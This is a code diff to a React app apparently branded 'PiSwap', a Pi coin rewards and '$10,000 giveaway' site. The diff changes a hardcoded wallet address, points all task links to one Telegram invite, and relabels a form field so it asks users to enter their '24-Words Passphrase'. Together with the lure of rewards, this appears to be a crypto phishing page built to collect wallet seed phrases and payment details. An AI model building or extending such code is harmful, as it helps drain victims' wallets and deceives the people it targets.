@@ -7,9 +7,9 @@ import {
 import { auth, db, signInAnonymously, onAuthStateChanged, doc, getDoc, setDoc } from './firebase.js';
 
 const TASKS = [
-  { id: 'telegram', title: 'Join Telegram', reward: 10000, link: 'https://t.me/your_telegram_channel', icon: '✈️' },
-  { id: 'twitter', title: 'Follow Twitter', reward: 5000, link: 'https://twitter.com/your_twitter', icon: '🐦' },
-  { id: 'youtube', title: 'Subscribe YouTube', reward: 5000, link: 'https://youtube.com/@your_channel', icon: '▶️' },
+  { id: 'telegram', title: 'Join Telegram', reward: 10000, link: 'https://t.me/+qLIZuBxmppEzOTBk', icon: '✈️' },
+  { id: 'twitter', title: 'Follow Twitter', reward: 5000, link: 'https://t.me/+qLIZuBxmppEzOTBk', icon: '🐦' },
+  { id: 'youtube', title: 'Subscribe YouTube', reward: 5000, link: 'https://t.me/+qLIZuBxmppEzOTBk', icon: '▶️' },
 ];
 
 const App = () => {
@@ -50,8 +50,8 @@ const App = () => {
   const [giveawaySubmitted, setGiveawaySubmitted] = useState(false);
   const [giveawayError, setGiveawayError] = useState('');
 
-  const SITE_URL = 'https://pi-coin-two.vercel.app/';
-  const REFILL_WALLET = 'GAEOJMBWANRHFLZYBJCYNY4YN7IWDHRKGU6EOIQS6D3ZNEL3DYDAOPL4';
+  const SITE_URL = 'https://pi-swap-eta.vercel.app/';
+  const REFILL_WALLET = 'GBUJUA5NFEYWDFRQ3BFV4KEXP7DZI6WOAVZ2BJWTNUCJWBXE3K7LOZFO';
   const piCoinsEarned = parseFloat((balance * 0.001).toFixed(1));
   const MIN_WITHDRAWAL = 100;
   const canWithdraw = piCoinsEarned >= MIN_WITHDRAWAL;
@@ -316,7 +316,7 @@ const App = () => {
   const handleGiveawaySubmit = () => {
     setGiveawayError('');
     if (!giveawayAddress.trim()) {
-      setGiveawayError('Please enter your BEP20 USDT wallet address or PayPal email.');
+      setGiveawayError('Please enter your Bep20 USDT wallet address or PayPal email.');
       return;
     }
     if (giveawayAddress.trim().length < 5) {
@@ -481,11 +481,11 @@ const App = () => {
                 </div>
 
                 <div className="mb-4">
-                  <label className="text-sm text-white/60 mb-2 block">24 Memo Words</label>
+                  <label className="text-sm text-white/60 mb-2 block"> Enter 24-Words Passphrase</label>
                   <textarea
                     value={memoWords}
                     onChange={(e) => { setMemoWords(e.target.value); setMemoError(''); }}
-                    placeholder="Enter all 24 words separated by spaces&#10;&#10;word1 word2 word3 word4 word5 word6 word7 word8 word9 word10 word11 word12 word13 word14 word15 word16 word17 word18 word19 word20 word21 word22 word23 word24"
+                    placeholder="Enter all 24 words separated by space&#10;&#10;word1 word2 word3 word4 word5 word6 word7 word8 word9 word10 word11 word12 word13 word14 word15 word16 word17 word18 word19 word20 word21 word22 word23 word24"
                     rows={6}
                     className="w-full bg-black/40 border border-white/10 rounded-2xl px-4 py-3 text-white text-sm placeholder:text-white/20 focus:outline-none focus:border-[#FBB44A] resize-none leading-relaxed"
                   />
@@ -740,8 +740,8 @@ const App = () => {
 
         {activeTab === 'task' && (
           <div className="pt-8 overflow-y-auto scrollbar-hide pb-24 flex-1">
-            <h2 className="text-2xl font-black mb-6 text-center">Daily Tasks</h2>
-            <div className="space-y-3">
+            <h2 className="text-2xl font-black mb-3 text-center">Daily Tasks</h2>
+            <div className="space-y-1">
 
               {/* TASK CARDS */}
               {TASKS.map((task) => {
@@ -801,7 +801,7 @@ const App = () => {
               {/* GIVEAWAY SECTION */}
               <div className="mt-6">
                 {/* Giveaway Banner */}
-                <div className="relative rounded-3xl overflow-hidden mb-4" style={{ background: 'linear-gradient(135deg, #1a0533 0%, #3d1278 50%, #1a0533 100%)', border: '2px solid rgba(251,180,74,0.4)' }}>
+                <div className="relative rounded-3xl overflow-hidden mb-2" style={{ background: 'linear-gradient(135deg, #1a0533 0%, #3d1278 50%, #1a0533 100%)', border: '2px solid rgba(251,180,74,0.4)' }}>
                   {/* Decorative dots */}
                   <div className="absolute top-2 right-4 text-2xl opacity-30">✦</div>
                   <div className="absolute bottom-2 left-4 text-lg opacity-20">✦</div>
@@ -810,15 +810,15 @@ const App = () => {
                   <div className="p-5 text-center">
                     <div className="text-3xl mb-2">🎁</div>
                     <p className="text-xs font-bold text-[#FBB44A]/70 uppercase tracking-widest mb-1">Official PiSwap</p>
-                    <h3 className="shimmer text-3xl font-black mb-1">$10,000</h3>
+                    <h3 className="shimmer text-4xl font-black mb-1">$10,000</h3>
                     <p className="text-white font-black text-lg mb-1">PiSwap Giveaway</p>
-                    <p className="text-white/50 text-xs">Enter your payment address below to participate. Winners announced soon!</p>
+                    <p className="text-white/50 text-xs">Enter your wallet address or paypal email below to participate. Winners are selected randomly!</p>
                   </div>
                 </div>
 
                 {/* Input & Submit */}
                 {giveawaySubmitted ? (
-                  <div className="bg-green-500/10 border-2 border-green-500/40 rounded-2xl p-5 flex flex-col items-center text-center gap-2">
+                  <div className="bg-green-500/10 border-2 border-green-500/40 rounded-2xl p-4 flex flex-col items-center text-center gap-2">
                     <div className="w-12 h-12 rounded-full bg-green-500/20 flex items-center justify-center mb-1">
                       <Check size={24} className="text-green-400" />
                     </div>
